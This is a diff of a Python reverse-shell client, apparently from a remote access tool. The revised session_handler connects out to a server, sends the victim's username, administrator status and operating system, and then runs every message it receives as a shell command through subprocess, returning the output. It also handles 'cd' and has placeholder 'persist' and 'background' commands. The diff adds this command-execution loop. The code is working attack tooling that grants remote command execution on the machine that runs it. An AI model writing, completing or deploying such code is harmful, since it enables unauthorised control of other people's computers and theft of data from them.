@@ -8,25 +8,36 @@ import time
 
 
 def session_handler(sock, target_ip, target_port):
-    print(f'[+] Connecting to {target_ip}.')
-    sock.connect((target_ip, target_port))
-    outbound(sock, os.getlogin())
-    outbound(sock, windll.shell32.IsUserAnAdmin)
-    time.sleep(1)
-    op_sys = platform.uname()
-    op_sys = (f'{op_sys[0]} {op_sys[2]}')
-    outbound(sock, op_sys)
-    print(f'[+] Connected to {target_ip}.')
-    while True:
-        message = inbound(sock)
-        print(f'[+] Message received - {message}')
-        if message == 'exit':
-            print('[-] The server has terminated the session.')
-            sock.close()
-            break
-        elif message == 'persist':
-            pass
-        process_message(sock, message)
+    try:
+        print(f'[+] Connecting to {target_ip}.')
+        sock.connect((target_ip, target_port))
+        outbound(sock, os.getlogin())
+        outbound(sock, windll.shell32.IsUserAnAdmin)
+        time.sleep(1)
+        op_sys = platform.uname()
+        op_sys = (f'{op_sys[0]} {op_sys[2]}')
+        outbound(sock, op_sys)
+        print(f'[+] Connected to {target_ip}.')
+        while True:
+
+            message = inbound(sock)
+            print(f'[+] Message received - {message}')
+            if message == 'exit':
+                print('[-] The server has terminated the session.')
+                sock.close()
+                break
+            elif message == 'persist':
+                pass
+            if message.split(" ")[0] == 'cd':
+                change_directory(sock, message)
+            elif message == 'background':
+                pass
+            else:
+                command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                output = command.stdout.read() + command.stderr.read()
+                outbound(sock, output.decode())
+    except ConnectionRefusedError:
+        pass
 
 
 def process_message(sock, message):
@@ -46,8 +57,10 @@ def change_directory(sock, message):
         cur_dir = os.getcwd()
         print(f'[+] Changed to {cur_dir}')
         outbound(sock, cur_dir)
+        return
     except FileNotFoundError:
         outbound(sock, 'Invalid directory.  Try again.')
+        return
 
 
 def execute_command(sock, message):
